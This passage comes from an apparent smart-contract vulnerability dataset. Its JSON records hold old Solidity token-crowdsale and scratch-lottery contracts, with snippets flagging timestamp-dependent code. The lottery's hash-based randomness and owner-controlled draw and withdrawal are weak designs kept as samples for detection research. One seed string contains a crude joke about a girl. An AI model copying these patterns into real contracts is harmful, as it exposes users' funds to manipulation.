value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n assert(token.approve(spender, value));\n }\n}\ncontract TokenTimelock {\n using SafeERC20 for ERC20Basic;\n ERC20Basic public token;\n address public beneficiary;\n uint256 public releaseTime;\n function TokenTimelock(ERC20Basic _token, address _beneficiary, uint256 _releaseTime) public {\n require(_releaseTime > block.timestamp);\n token = _token;\n beneficiary = _beneficiary;\n releaseTime = _releaseTime;\n }\n function release() public {\n require(block.timestamp >= releaseTime);\n uint256 amount = token.balanceOf(this);\n require(amount > 0);\n token.safeTransfer(beneficiary, amount);\n }\n}\ncontract CappedCrowdsale is Crowdsale, Ownable {\n using SafeMath for uint256;\n uint256 public hardCap;\n uint256 public tokensToLock;\n uint256 public releaseTime;\n bool public isFinalized = false;\n TokenTimelock public timeLock;\n event Finalized();\n event FinishMinting();\n event TokensMinted(\n address indexed beneficiary,\n uint256 indexed amount\n );\n function CappedCrowdsale(uint256 _hardCap, uint256 _tokensToLock, uint256 _releaseTime) public {\n require(_hardCap > 0);\n require(_tokensToLock > 0);\n require(_releaseTime > endTime);\n hardCap = _hardCap;\n releaseTime = _releaseTime;\n tokensToLock = _tokensToLock;\n timeLock = new TokenTimelock(token, wallet, releaseTime);\n }\n function finalize() onlyOwner public {\n require(!isFinalized);\n token.mint(address(timeLock), tokensToLock);\n Finalized();\n isFinalized = true;\n }\n function finishMinting() onlyOwner public {\n require(token.mintingFinished() == false);\n require(isFinalized);\n token.finishMinting();\n FinishMinting();\n }\n function mint(address beneficiary, uint256 amount) onlyOwner public {\n require(!token.mintingFinished());\n require(isFinalized);\n require(amount > 0);\n require(beneficiary != address(0));\n token.mint(beneficiary, amount);\n TokensMinted(beneficiary, amount);\n }\n function hasEnded() public view returns (bool) {\n bool capReached = weiRaised >= hardCap;\n return super.hasEnded() || capReached || isFinalized;\n }\n}\ncontract OnlyWhiteListedAddresses is Ownable {\n using SafeMath for uint256;\n address utilityAccount;\n mapping (address => bool) whitelist;\n mapping (address => address) public referrals;\n modifier onlyOwnerOrUtility() {\n require(msg.sender == owner || msg.sender == utilityAccount);\n _;\n }\n event WhitelistedAddresses(\n address[] users\n );\n event ReferralsAdded(\n address[] user,\n address[] referral\n );\n function OnlyWhiteListedAddresses(address _utilityAccount) public {\n utilityAccount = _utilityAccount;\n }\n function whitelistAddress (address[] users) public onlyOwnerOrUtility {\n for (uint i = 0; i < users.length; i++) {\n whitelist[users[i]] = true;\n }\n WhitelistedAddresses(users);\n }\n function addAddressReferrals (address[] users, address[] _referrals) public onlyOwnerOrUtility {\n require(users.length == _referrals.length);\n for (uint i = 0; i < users.length; i++) {\n require(isWhiteListedAddress(users[i]));\n referrals[users[i]] = _referrals[i];\n }\n ReferralsAdded(users, _referrals);\n }\n function isWhiteListedAddress (address addr) public view returns (bool) {\n return whitelist[addr];\n }\n}\ncontract HoldCrowdsale is CappedCrowdsale, OnlyWhiteListedAddresses {\n using SafeMath for uint256;\n struct TokenPurchaseRecord {\n uint256 timestamp;\n uint256 weiAmount;\n address beneficiary;\n }\n uint256 transactionId = 1;\n mapping (uint256 => TokenPurchaseRecord) pendingTransactions;\n mapping (uint256 => bool) completedTransactions;\n uint256 public referralPercentage;\n uint256 public individualCap;\n event TokenPurchaseRequest(\n uint256 indexed transactionId,\n address beneficiary,\n uint256 indexed timestamp,\n uint256 indexed weiAmount,\n uint256 tokensAmount\n );\n event ReferralTokensSent(\n address indexed beneficiary,\n uint256 indexed tokensAmount,\n uint256 indexed transactionId\n );\n event BonusTokensSent(\n address indexed beneficiary,\n uint256 indexed tokensAmount,\n uint256 indexed transactionId\n );\n function HoldCrowdsale(\n uint256 _startTime,\n uint256 _endTime,\n uint256 _icoHardCapWei,\n uint256 _referralPercentage,\n uint256 _rate,\n address _wallet,\n uint256 _tokensToLock,\n uint256 _releaseTime,\n uint256 _privateWeiRaised,\n uint256 _individualCap,\n address _utilityAccount\n ) public\n OnlyWhiteListedAddresses(_utilityAccount)\n CappedCrowdsale(_icoHardCapWei, _tokensToLock, _releaseTime)\n Crowdsale(_startTime, _endTime, _rate, _wallet, _privateWeiRaised)\n {\n referralPercentage = _referralPercentage;\n individualCap = _individualCap;\n }\n function () external payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address beneficiary) public payable {\n require(!isFinalized);\n require(beneficiary == msg.sender);\n require(msg.value != 0);\n require(msg.value >= individualCap);\n uint256 weiAmount = msg.value;\n require(isWhiteListedAddress(beneficiary));\n require(validPurchase(weiAmount));\n weiRaised = weiRaised.add(weiAmount);\n uint256 _transactionId = transactionId;\n uint256 tokensAmount = weiAmount.mul(rate);\n pendingTransactions[_transactionId] = TokenPurchaseRecord(now, weiAmount, beneficiary);\n transactionId += 1;\n TokenPurchaseRequest(_transactionId, beneficiary, now, weiAmount, tokensAmount);\n forwardFunds();\n }\n function issueTokensMultiple(uint256[] _transactionIds, uint256[] bonusTokensAmounts) public onlyOwner {\n require(isFinalized);\n require(_transactionIds.length == bonusTokensAmounts.length);\n for (uint i = 0; i < _transactionIds.length; i++) {\n issueTokens(_transactionIds[i], bonusTokensAmounts[i]);\n }\n }\n function issueTokens(uint256 _transactionId, uint256 bonusTokensAmount) internal {\n require(completedTransactions[_transactionId] != true);\n require(pendingTransactions[_transactionId].timestamp != 0);\n TokenPurchaseRecord memory record = pendingTransactions[_transactionId];\n uint256 tokens = record.weiAmount.mul(rate);\n address referralAddress = referrals[record.beneficiary];\n token.mint(record.beneficiary, tokens);\n TokenPurchase(record.beneficiary, record.weiAmount, tokens, _transactionId);\n completedTransactions[_transactionId] = true;\n if (bonusTokensAmount != 0) {\n require(bonusTokensAmount != 0);\n token.mint(record.beneficiary, bonusTokensAmount);\n BonusTokensSent(record.beneficiary, bonusTokensAmount, _transactionId);\n }\n if (referralAddress != address(0)) {\n uint256 referralAmount = tokens.mul(referralPercentage).div(uint256(100));\n token.mint(referralAddress, referralAmount);\n ReferralTokensSent(referralAddress, referralAmount, _transactionId);\n }\n }\n function validPurchase(uint256 weiAmount) internal view returns (bool) {\n bool withinCap = weiRaised.add(weiAmount) <= hardCap;\n bool withinCrowdsaleInterval = now >= startTime && now <= endTime;\n return withinCrowdsaleInterval && withinCap;\n }\n function forwardFunds() internal {\n wallet.transfer(msg.value);\n }\n}\ncontract Migrations {\n address public owner;\n uint public last_completed_migration;\n modifier restricted() {\n if (msg.sender == owner) _;\n }\n function Migrations() public {\n owner = msg.sender;\n }\n function setCompleted(uint completed) public restricted {\n last_completed_migration = completed;\n }\n function upgrade(address new_address) public restricted {\n Migrations upgraded = Migrations(new_address);\n upgraded.setCompleted(last_completed_migration);\n }\n}",
  "extract_feature": [
    "function TokenTimelock(ERC20Basic _token, address _beneficiary, uint256 _releaseTime) public {\nrequire(_releaseTime > block.timestamp);\ntoken = _token;\nbeneficiary = _beneficiary;\nreleaseTime = _releaseTime;\n}",
    "function release() public {\nrequire(block.timestamp >= releaseTime);\nuint256 amount = token.balanceOf(this);\nrequire(amount > 0);\ntoken.safeTransfer(beneficiary, amount);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1ec8"
  },
  "filename": "10560.sol",
  "content": "pragma solidity ^0.4.21;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n totalSupply_ = totalSupply_.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n emit Mint(_to, _amount);\n emit Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n emit MintFinished();\n return true;\n }\n}\ncontract HoldToken is MintableToken {\n using SafeMath for uint256;\n string public name = 'HOLD';\n string public symbol = 'HOLD';\n uint8 public decimals = 18;\n event Burn(address indexed burner, uint256 value);\n event BurnTransferred(address indexed previousBurner, address indexed newBurner);\n address burnerRole;\n modifier onlyBurner() {\n require(msg.sender == burnerRole);\n _;\n }\n function HoldToken(address _burner) public {\n burnerRole = _burner;\n }\n function transferBurnRole(address newBurner) public onlyBurner {\n require(newBurner != address(0));\n BurnTransferred(burnerRole, newBurner);\n burnerRole = newBurner;\n }\n function burn(uint256 _value) public onlyBurner {\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n Burn(msg.sender, _value);\n Transfer(msg.sender, address(0), _value);\n }\n}\ncontract Crowdsale {\n using SafeMath for uint256;\n HoldToken public token;\n uint256 public startTime;\n uint256 public endTime;\n uint256 public rate;\n address public wallet;\n uint256 public weiRaised;\n event TokenPurchase(address indexed beneficiary, uint256 indexed value, uint256 indexed amount, uint256 transactionId);\n function Crowdsale(\n uint256 _startTime,\n uint256 _endTime,\n uint256 _rate,\n address _wallet,\n uint256 _initialWeiRaised\n ) public {\n require(_startTime >= now);\n require(_endTime >= _startTime);\n require(_wallet != address(0));\n require(_rate > 0);\n token = new HoldToken(_wallet);\n startTime = _startTime;\n endTime = _endTime;\n rate = _rate;\n wallet = _wallet;\n weiRaised = _initialWeiRaised;\n }\n function hasEnded() public view returns (bool) {\n return now > endTime;\n }\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n assert(token.transfer(to, value));\n }\n function safeTransferFrom(\n ERC20 token,\n address from,\n address to,\n uint256 value\n )\n internal\n {\n assert(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n assert(token.approve(spender, value));\n }\n}\ncontract TokenTimelock {\n using SafeERC20 for ERC20Basic;\n ERC20Basic public token;\n address public beneficiary;\n uint256 public releaseTime;\n function TokenTimelock(ERC20Basic _token, address _beneficiary, uint256 _releaseTime) public {\n require(_releaseTime > block.timestamp);\n token = _token;\n beneficiary = _beneficiary;\n releaseTime = _releaseTime;\n }\n function release() public {\n require(block.timestamp >= releaseTime);\n uint256 amount = token.balanceOf(this);\n require(amount > 0);\n token.safeTransfer(beneficiary, amount);\n }\n}\ncontract CappedCrowdsale is Crowdsale, Ownable {\n using SafeMath for uint256;\n uint256 public hardCap;\n uint256 public tokensToLock;\n uint256 public releaseTime;\n bool public isFinalized = false;\n TokenTimelock public timeLock;\n event Finalized();\n event FinishMinting();\n event TokensMinted(\n address indexed beneficiary,\n uint256 indexed amount\n );\n function CappedCrowdsale(uint256 _hardCap, uint256 _tokensToLock, uint256 _releaseTime) public {\n require(_hardCap > 0);\n require(_tokensToLock > 0);\n require(_releaseTime > endTime);\n hardCap = _hardCap;\n releaseTime = _releaseTime;\n tokensToLock = _tokensToLock;\n timeLock = new TokenTimelock(token, wallet, releaseTime);\n }\n function finalize() onlyOwner public {\n require(!isFinalized);\n token.mint(address(timeLock), tokensToLock);\n Finalized();\n isFinalized = true;\n }\n function finishMinting() onlyOwner public {\n require(token.mintingFinished() == false);\n require(isFinalized);\n token.finishMinting();\n FinishMinting();\n }\n function mint(address beneficiary, uint256 amount) onlyOwner public {\n require(!token.mintingFinished());\n require(isFinalized);\n require(amount > 0);\n require(beneficiary != address(0));\n token.mint(beneficiary, amount);\n TokensMinted(beneficiary, amount);\n }\n function hasEnded() public view returns (bool) {\n bool capReached = weiRaised >= hardCap;\n return super.hasEnded() || capReached || isFinalized;\n }\n}\ncontract OnlyWhiteListedAddresses is Ownable {\n using SafeMath for uint256;\n address utilityAccount;\n mapping (address => bool) whitelist;\n mapping (address => address) public referrals;\n modifier onlyOwnerOrUtility() {\n require(msg.sender == owner || msg.sender == utilityAccount);\n _;\n }\n event WhitelistedAddresses(\n address[] users\n );\n event ReferralsAdded(\n address[] user,\n address[] referral\n );\n function OnlyWhiteListedAddresses(address _utilityAccount) public {\n utilityAccount = _utilityAccount;\n }\n function whitelistAddress (address[] users) public onlyOwnerOrUtility {\n for (uint i = 0; i < users.length; i++) {\n whitelist[users[i]] = true;\n }\n WhitelistedAddresses(users);\n }\n function addAddressReferrals (address[] users, address[] _referrals) public onlyOwnerOrUtility {\n require(users.length == _referrals.length);\n for (uint i = 0; i < users.length; i++) {\n require(isWhiteListedAddress(users[i]));\n referrals[users[i]] = _referrals[i];\n }\n ReferralsAdded(users, _referrals);\n }\n function isWhiteListedAddress (address addr) public view returns (bool) {\n return whitelist[addr];\n }\n}\ncontract HoldCrowdsale is CappedCrowdsale, OnlyWhiteListedAddresses {\n using SafeMath for uint256;\n struct TokenPurchaseRecord {\n uint256 timestamp;\n uint256 weiAmount;\n address beneficiary;\n }\n uint256 transactionId = 1;\n mapping (uint256 => TokenPurchaseRecord) pendingTransactions;\n mapping (uint256 => bool) completedTransactions;\n uint256 public referralPercentage;\n uint256 public individualCap;\n event TokenPurchaseRequest(\n uint256 indexed transactionId,\n address beneficiary,\n uint256 indexed timestamp,\n uint256 indexed weiAmount,\n uint256 tokensAmount\n );\n event ReferralTokensSent(\n address indexed beneficiary,\n uint256 indexed tokensAmount,\n uint256 indexed transactionId\n );\n event BonusTokensSent(\n address indexed beneficiary,\n uint256 indexed tokensAmount,\n uint256 indexed transactionId\n );\n function HoldCrowdsale(\n uint256 _startTime,\n uint256 _endTime,\n uint256 _icoHardCapWei,\n uint256 _referralPercentage,\n uint256 _rate,\n address _wallet,\n uint256 _tokensToLock,\n uint256 _releaseTime,\n uint256 _privateWeiRaised,\n uint256 _individualCap,\n address _utilityAccount\n ) public\n OnlyWhiteListedAddresses(_utilityAccount)\n CappedCrowdsale(_icoHardCapWei, _tokensToLock, _releaseTime)\n Crowdsale(_startTime, _endTime, _rate, _wallet, _privateWeiRaised)\n {\n referralPercentage = _referralPercentage;\n individualCap = _individualCap;\n }\n function () external payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address beneficiary) public payable {\n require(!isFinalized);\n require(beneficiary == msg.sender);\n require(msg.value != 0);\n require(msg.value >= individualCap);\n uint256 weiAmount = msg.value;\n require(isWhiteListedAddress(beneficiary));\n require(validPurchase(weiAmount));\n weiRaised = weiRaised.add(weiAmount);\n uint256 _transactionId = transactionId;\n uint256 tokensAmount = weiAmount.mul(rate);\n pendingTransactions[_transactionId] = TokenPurchaseRecord(now, weiAmount, beneficiary);\n transactionId += 1;\n TokenPurchaseRequest(_transactionId, beneficiary, now, weiAmount, tokensAmount);\n forwardFunds();\n }\n function issueTokensMultiple(uint256[] _transactionIds, uint256[] bonusTokensAmounts) public onlyOwner {\n require(isFinalized);\n require(_transactionIds.length == bonusTokensAmounts.length);\n for (uint i = 0; i < _transactionIds.length; i++) {\n issueTokens(_transactionIds[i], bonusTokensAmounts[i]);\n }\n }\n function issueTokens(uint256 _transactionId, uint256 bonusTokensAmount) internal {\n require(completedTransactions[_transactionId] != true);\n require(pendingTransactions[_transactionId].timestamp != 0);\n TokenPurchaseRecord memory record = pendingTransactions[_transactionId];\n uint256 tokens = record.weiAmount.mul(rate);\n address referralAddress = referrals[record.beneficiary];\n token.mint(record.beneficiary, tokens);\n TokenPurchase(record.beneficiary, record.weiAmount, tokens, _transactionId);\n completedTransactions[_transactionId] = true;\n if (bonusTokensAmount != 0) {\n require(bonusTokensAmount != 0);\n token.mint(record.beneficiary, bonusTokensAmount);\n BonusTokensSent(record.beneficiary, bonusTokensAmount, _transactionId);\n }\n if (referralAddress != address(0)) {\n uint256 referralAmount = tokens.mul(referralPercentage).div(uint256(100));\n token.mint(referralAddress, referralAmount);\n ReferralTokensSent(referralAddress, referralAmount, _transactionId);\n }\n }\n function validPurchase(uint256 weiAmount) internal view returns (bool) {\n bool withinCap = weiRaised.add(weiAmount) <= hardCap;\n bool withinCrowdsaleInterval = now >= startTime && now <= endTime;\n return withinCrowdsaleInterval && withinCap;\n }\n function forwardFunds() internal {\n wallet.transfer(msg.value);\n }\n}\ncontract Migrations {\n address public owner;\n uint public last_completed_migration;\n modifier restricted() {\n if (msg.sender == owner) _;\n }\n function Migrations() public {\n owner = msg.sender;\n }\n function setCompleted(uint completed) public restricted {\n last_completed_migration = completed;\n }\n function upgrade(address new_address) public restricted {\n Migrations upgraded = Migrations(new_address);\n upgraded.setCompleted(last_completed_migration);\n }\n}",
  "extract_feature": [
    "function TokenTimelock(ERC20Basic _token, address _beneficiary, uint256 _releaseTime) public {\nrequire(_releaseTime > block.timestamp);\ntoken = _token;\nbeneficiary = _beneficiary;\nreleaseTime = _releaseTime;\n}",
    "function release() public {\nrequire(block.timestamp >= releaseTime);\nuint256 amount = token.balanceOf(this);\nrequire(amount > 0);\ntoken.safeTransfer(beneficiary, amount);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1ec9"
  },
  "filename": "10661.sol",
  "content": "pragma solidity ^0.4.16;\nlibrary SafeMath {\n function add(uint a, uint b) internal pure returns (uint c) {\n c = a + b;\n require(c >= a);\n }\n function sub(uint a, uint b) internal pure returns (uint c) {\n require(b <= a);\n c = a - b;\n }\n function mul(uint a, uint b) internal pure returns (uint c) {\n c = a * b;\n require(a == 0 || c / a == b);\n }\n function div(uint a, uint b) internal pure returns (uint c) {\n require(b > 0);\n c = a / b;\n }\n}\ncontract Owned {\n address public owner;\n address public newOwner;\n event OwnershipTransferred(address indexed _from, address indexed _to);\n function Owned() public {\n owner = msg.sender;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n newOwner = _newOwner;\n }\n function acceptOwnership() public {\n require(msg.sender == newOwner);\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n newOwner = address(0);\n }\n}\ncontract JungleScratch is Owned {\n using SafeMath for uint;\n uint public LimitBottom = 0.02 ether;\n uint public LimitTop = 0.1 ether;\n address public Drawer;\n struct Game {\n bytes32 SecretKey_P;\n bool isPlay;\n bool isPay;\n uint Result;\n uint Time;\n address Buyer;\n uint value;\n }\n mapping (bytes32 => Game) public TicketPool;\n event SubmitTicket(bytes32 indexed SecretKey_D_hash, uint Bet_amount,bytes32 SecretKey_P, address Player);\n event Result(bytes32 SecretKey_D_hash, bytes32 SecretKey_D,address Buyer, uint[] Bird_Result, uint Game_Result, uint time);\n event Pay(bytes32 indexed SecretKey_D_hash, address indexed Buyer, uint Game_Result);\n event Owe(bytes32 indexed SecretKey_D_hash, address indexed Buyer, uint Game_Result);\n event OwePay(bytes32 indexed SecretKey_D_hash, address indexed Buyer, uint Game_Result);\n function JungleScratch (address drawer_) public {\n Drawer = drawer_;\n }\n function submit(bytes32 secretKey_P, bytes32 secretKey_D_hash) payable public {\n require(msg.value == 0.02 ether || msg.value == 0.04 ether || msg.value == 0.06 ether || msg.value == 0.08 ether || msg.value == 0.1 ether);\n require(TicketPool[secretKey_D_hash].Time == 0);\n require(msg.value >= LimitBottom && msg.value <= LimitTop);\n uint check = msg.value.div(20000000000000000);\n require(check == 1 || check == 2 || check == 3 || check == 4 || check == 5);\n SubmitTicket(secretKey_D_hash, msg.value, secretKey_P, msg.sender);\n TicketPool[secretKey_D_hash] = Game(secretKey_P,false,false,0,block.timestamp,msg.sender,msg.value);\n }\n function award(bytes32 secretKey_D) public {\n require(Drawer == msg.sender);\n bytes32 secretKey_D_hash = keccak256(secretKey_D);\n Game local_ = TicketPool[secretKey_D_hash];\n require(local_.Time != 0 && !local_.isPlay);\n uint game_result = 0;\n uint[] memory RandomResult = new uint[](9);\n RandomResult[0] = uint(keccak256(\"Pig World is an AWESOME team\",secretKey_D,'a',local_.SecretKey_P)) % 1000 + 1;\n RandomResult[1] = uint(keccak256(local_.SecretKey_P,\"Every Game in our world is provably fair\",secretKey_D,'b')) % 1000 + 1;\n RandomResult[2] = uint(keccak256('c',secretKey_D,\"OMG it is a revolution dapp\",local_.SecretKey_P)) % 1000 + 1;\n RandomResult[3] = uint(keccak256(secretKey_D,\"hahahaha\",local_.SecretKey_P,'d',\"thanks for our team member and all player support.\")) % 1000 + 1;\n RandomResult[4] = uint(keccak256(\"CC is our CEO\",secretKey_D,\"he can eat Betel nut\",local_.SecretKey_P,'e')) % 1000 + 1;\n RandomResult[5] = uint(keccak256(20180612,\"justin is our researcher\",secretKey_D,\"and he love little girl(at least 18, so it is ok)\",local_.SecretKey_P,'f')) % 1000 + 1;\n RandomResult[6] = uint(keccak256(\"jeremy is our marketing\",secretKey_D,'g',local_.SecretKey_P,\"he is very humble and serious\")) % 1000 + 1;\n RandomResult[7] = uint(keccak256('h',secretKey_D,\"We are a geek team\",local_.SecretKey_P,\"we love blockchain\")) % 1000 + 1;\n RandomResult[8] = uint(keccak256(secretKey_D,\"hope you win a big prize\",local_.SecretKey_P,\"love you all!!!\",'i')) % 1000 + 1;\n for (uint n = 0; n < 9; n++) {\n if(RandomResult[n]< 81){\n RandomResult[n] = 0;\n } else if(RandomResult[n]< 168){\n RandomResult[n] = 1;\n } else if(RandomResult[n]< 266){\n RandomResult[n] = 2;\n } else if(RandomResult[n]< 381){\n RandomResult[n] = 3;\n } else if(RandomResult[n]< 535){\n RandomResult[n] = 4;\n } else if(RandomResult[n]< 749){\n RandomResult[n] = 5;\n } else if(RandomResult[n]< 1001){\n RandomResult[n] = 6;\n }\n }\n for(uint nn = 0; nn < 6; nn++){\n uint count = 0;\n for(uint p = 0; p < 9; p++){\n if(RandomResult[p] == nn)\n count ++;\n }\n if(count >= 3 && nn == 0)\n game_result = game_result.add(TicketPool[secretKey_D_hash].value.div(20000000000000000).mul(0.1 ether));\n if(count >= 3 && nn == 1)\n game_result = game_result.add(TicketPool[secretKey_D_hash].value.div(20000000000000000).mul(0.08 ether));\n if(count >= 3 && nn == 2)\n game_result = game_result.add(TicketPool[secretKey_D_hash].value.div(20000000000000000).mul(0.06 ether));\n if(count >= 3 && nn == 3)\n game_result = game_result.add(TicketPool[secretKey_D_hash].value.div(20000000000000000).mul(0.04 ether));\n if(count >= 3 && nn == 4)\n game_result = game_result.add(TicketPool[secretKey_D_hash].value.div(20000000000000000).mul(0.02 ether));\n if(count >= 3 && nn == 5)\n game_result = game_result.add(TicketPool[secretKey_D_hash].value.div(20000000000000000).mul(0.01 ether));\n }\n if(game_result != 0){\n TicketPool[secretKey_D_hash].Result = game_result;\n if (address(this).balance >= game_result && TicketPool[secretKey_D_hash].Buyer.send(game_result)) {\n TicketPool[secretKey_D_hash].isPay = true;\n Pay(secretKey_D_hash,TicketPool[secretKey_D_hash].Buyer, game_result);\n } else {\n Owe(secretKey_D_hash, TicketPool[secretKey_D_hash].Buyer, game_result);\n TicketPool[secretKey_D_hash].isPay = false;\n }\n } else {\n TicketPool[secretKey_D_hash].isPay = true;\n }\n Result(secretKey_D_hash, secretKey_D, TicketPool[secretKey_D_hash].Buyer, RandomResult, game_result, block.timestamp);\n TicketPool[secretKey_D_hash].isPlay = true;\n }\n function () public payable {\n }\n function withdraw(uint withdrawEther_) public onlyOwner {\n msg.sender.transfer(withdrawEther_);\n }\n function changeLimit(uint _bottom, uint _top) public onlyOwner {\n LimitBottom = _bottom;\n LimitTop = _top;\n }\n function changeDrawer(address drawer_) public onlyOwner {\n Drawer = drawer_;\n }\n function getisPlay(bytes32 secretKey_D_hash) public constant returns (bool isplay){\n return TicketPool[secretKey_D_hash].isPlay;\n }\n function getTicketTime(bytes32 secretKey_D_hash) public constant returns (uint Time){\n return TicketPool[secretKey_D_hash].Time;\n }\n function chargeOwe(bytes32 secretKey_D_hash) public {\n require(!TicketPool[secretKey_D_hash].isPay);\n require(TicketPool[secretKey_D_hash].isPlay);\n require(TicketPool[secretKey_D_hash].Result != 0);\n if(address(this).balance >= TicketPool[secretKey_D_hash].Result){\n if (TicketPool[secretKey_D_hash].Buyer.send(TicketPool[secretKey_D_hash].Result)) {\n TicketPool[secretKey_D_hash].isPay = true;\n OwePay(secretKey_D_hash, TicketPool[secretKey_D_hash].Buyer, TicketPool[secretKey_D_hash].Result);\n }\n }\n }\n}",
  "extract_feature": [
    "function submit(bytes32 secretKey_P, bytes32 secretKey_D_hash) payable public {\nrequire(msg.value == 0.02 ether || msg.value == 0.04 ether || msg.value == 0.06 ether || msg.value == 0.08 ether || msg.value == 0.1 ether);\nrequire(TicketPool[secretKey_D_hash].Time == 0);\nrequire(msg.value >= LimitBottom && msg.value <= LimitTop);\nuint check = msg.value.div(20000000000000000);\nrequire(check == 1 || check == 2 || check == 3 || check == 4 || check == 5);\nSubmitTicket(secretKey_D_hash, msg.value, secretKey_P, msg.sender);\nTicketPool[secretKey_D_hash] = Game(secretKey_P,false,false,0,block.timestamp,msg.sender,msg.value);\n}",
    "function award(bytes32 secretKey_D) public {\nrequire(Drawer == msg.sender);\nbytes32 secretKey_D_hash = keccak256(secretKey_D);\nGame local_ = TicketPool[secretKey_D_hash];\nrequire(local_.Time != 0 && !local_.isPlay);\nuint game_result = 0;\nuint[] memory RandomResult = new uint[](9);\nRandomResult[0] = uint(keccak256(\"Pig World is an AWESOME team\",secretKey_D,'a',local_.SecretKey_P)) % 1000 + 1;\nRandomResult[1] = uint(keccak256(local_.SecretKey_P,\"Every Game in our world is provably fair\",secretKey_D,'b')) % 1000 + 1;\nRandomResult[2] = uint(keccak256('c',secretKey_D,\"OMG it is a revolution dapp\",local_.SecretKey_P)) % 1000 + 1;\nRandomResult[3] = uint(keccak256(secretKey_D,\"hahahaha\",local_.SecretKey_P,'d',\"thanks for our team member and all player support.\")) % 1000 + 1;\nRandomResult[4] = uint(keccak256(\"CC is our CEO\",secretKey_D,\"he can eat Betel nut\",local_.SecretKey_P,'e')) % 1000 + 1;\nRandomResult[5] = uint(keccak256(20180612,\"justin is our researcher\",secretKey_D,\"and he love little girl(at least 18, so it is ok)\",local_.SecretKey_P,'f')) % 1000 + 1;\nRandomResult[6] = uint(keccak256(\"jeremy is our marketing\",secretKey_D,'g',local_.SecretKey_P,\"he is very humble and serious\")) % 1000 + 1;\nRandomResult[7] = uint(keccak256('h',secretKey_D,\"We are a geek team\",local_.SecretKey_P,\"we love blockchain\")) % 1000 + 1;\nRandomResult[8] = uint(keccak256(secretKey_D,\"hope you win a big prize\",local_.SecretKey_P,\"love you all!!!\",'i')) % 1000 + 1;\nfor (uint n = 0; n < 9; n++) {\nif(RandomResult[n]< 81){\nRandomResult[n] = 0;\n} else if(RandomResult[n]< 168){\nRandomResult[n] = 1;\n} else if(RandomResult[n]< 266){\nRandomResult[n] = 2;\n} else if(RandomResult[n]< 381){\nRandomResult[n] = 3;\n} else if(RandomResult[n]< 535){\nRandomResult[n] = 4;\n} else if(RandomResult[n]< 749){\nRandomResult[n] = 5;\n} else if(RandomResult[n]< 1001){\nRandomResult[n] = 6;\n}\n}\nfor(uint nn = 0; nn < 6; 